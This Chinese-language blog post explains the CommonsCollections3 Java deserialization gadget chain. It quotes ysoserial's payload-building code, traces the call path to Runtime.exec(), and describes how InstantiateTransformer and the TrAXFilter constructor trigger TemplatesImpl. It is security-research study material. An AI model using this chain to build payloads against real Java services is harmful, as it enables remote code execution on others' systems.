---
title: "Java反序列化利用链学习 - CommonCollection3"
date: 2022-05-02T14:21:00+08:00
lastmod: 2022-05-02T14:22:00+08:00
draft: false
lightgallery: true
categories: [
    "Java Security",
]
tags: [
    "deserialiaztion",
    "java",
    "common collection",
]
---
## Java反序列化利用链系列

* [Java反序列化利用链 - CommonCollection1](commoncollection1.md)
* [Java反序列化利用链 - CommonCollection2](commoncollection2.md)
* [Java反序列化利用链 - CommonCollection3](commoncollection3.md)
* [Java反序列化利用链 - CommonCollection4](commoncollection4.md)
* [Java反序列化利用链 - CommonCollection5](commoncollection5.md)
* [Java反序列化利用链 - CommonCollection6](commoncollection6.md)
* [Java反序列化利用链 - CommonCollection7](commoncollection7.md)

## Java反序列化利用链 - CommonCollection3

### 前置条件

* JDK 1.7
* commons-collections 3.1

### 利用链分析

`CommonCollection3`为`CommonCollection1`的变种，不同的是将`org.apache.commons.collections.functors.InvokerTransformer`变为了`org.apache.commons.collections.functors.InstantiateTransformer`，并且修改了`ChainedTransformer`中的调用链替换为使用`TemplateImpl`。

`ysoserial`中的相关代码如下

```java
public Object getObject(final String command) throws Exception {
    Object templatesImpl = Gadgets.createTemplatesImpl(command);

    // inert chain for setup
    final Transformer transformerChain = new ChainedTransformer(
        new Transformer[]{ new ConstantTransformer(1) });
    // real chain for after setup
    final Transformer[] transformers = new Transformer[] {
            new ConstantTransformer(TrAXFilter.class),
            new InstantiateTransformer(
                    new Class[] { Templates.class },
                    new Object[] { templatesImpl } )};

    final Map innerMap = new HashMap();

    final Map lazyMap = LazyMap.decorate(innerMap, transformerChain);

    final Map mapProxy = Gadgets.createMemoitizedProxy(lazyMap, Map.class);

    final InvocationHandler handler = Gadgets.createMemoizedInvocationHandler(mapProxy);

    Reflections.setFieldValue(transformerChain, "iTransformers", transformers); // arm with actual transformer chain

    return handler;
}
```

`CommonCollection3`利用链的调用过程大致如下：

```
Gadget chain:
    ObjectInputStream.readObject()
        AnnotationInvocationHandler.readObject()
            Map(Proxy).entrySet()
                AnnotationInvocationHandler.invoke()
                    LazyMap.get()
                        ChainedTransformer.transform()
                            ConstantTransformer.transform()
                            InstantiateTransformer.transform()
                                Method.invoke()
                                    TrAXFilter.TrAXFilter()
                                        TemplatesImpl.newTransformer()
                                            TemplatesImpl.defineTransletClasses()
                                                Runtime.exec()
```

相关的调用内容在[Java反序列化利用链 - CommonCollection1]({{< relref "commoncollection1/index.md" >}})和[Java反序列化利用链 - CommonCollection2]({{< relref "commoncollection2/index.md" >}})中都有涉及，这里需要关注一下`com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter`这个类，以及`org.apache.commons.collections.functors.InstantiateTransformer`。

### InstantiateTransformer

`InstantiateTransformer`的`compare`函数如下

```java
public Object transform(Object input) {
    try {
        if (!(input instanceof Class)) {
            throw new FunctorException("InstantiateTransformer: Input object was not an instanceof Class, it was a " + (input == null ? "null object" : input.getClass().getName()));
        } else {
            Constructor con = ((Class)input).getConstructor(this.iParamTypes);
            return con.newInstance(this.iArgs);
        }
    } catch (NoSuchMethodException var6) {
        throw new FunctorException("InstantiateTransformer: The constructor must exist and be public ");
    } catch (InstantiationException var7) {
        throw new FunctorException("InstantiateTransformer: InstantiationException", var7);
    } catch (IllegalAccessException var8) {
        throw new FunctorException("InstantiateTransformer: Constructor must be public", var8);
    } catch (InvocationTargetException var9) {
        throw new FunctorException("InstantiateTransformer: Constructor threw an exception", var9);
    }
}
```

它会查找`input`对象中由`InstantiateTransformer`的成员`this.iParamTypes`指定的构造函数，并通过`this.iArgs`。它的作用就是实例化某个特定对象，但是对利用链的作用还可以是触发某个类特定的构造函数。

### TrAXFilter

在`CommonCollection2`中，·`TemplateImpl`这条链是通过`TemplatesImpl.newTransformer()`为起点开始的。但这里不太一样，用到了`com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter`。

根据`ChainedTransformer`的调用顺序，先调用`ConstantTransformer.transform()`返回`TrAXFilter`对象，再执行参数类型为`Templates`的构造函数。

```java
public TrAXFilter(Templates templates)  throws
    TransformerConfigurationException
{
    _templates = templates;
    _transformer = (TransformerImpl) templates.newTransformer();
    _transformerHandler = new TransformerHandlerImpl(_transformer);
    _overrideDefaultParser = _transformer.overrideDefaultParser();
}
```

从这里就可以看到它会调用`templates.newTransformer()`，从而触发`TemplateImpl`调用链。

## References

1. <https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/CommonsCollections3.java>
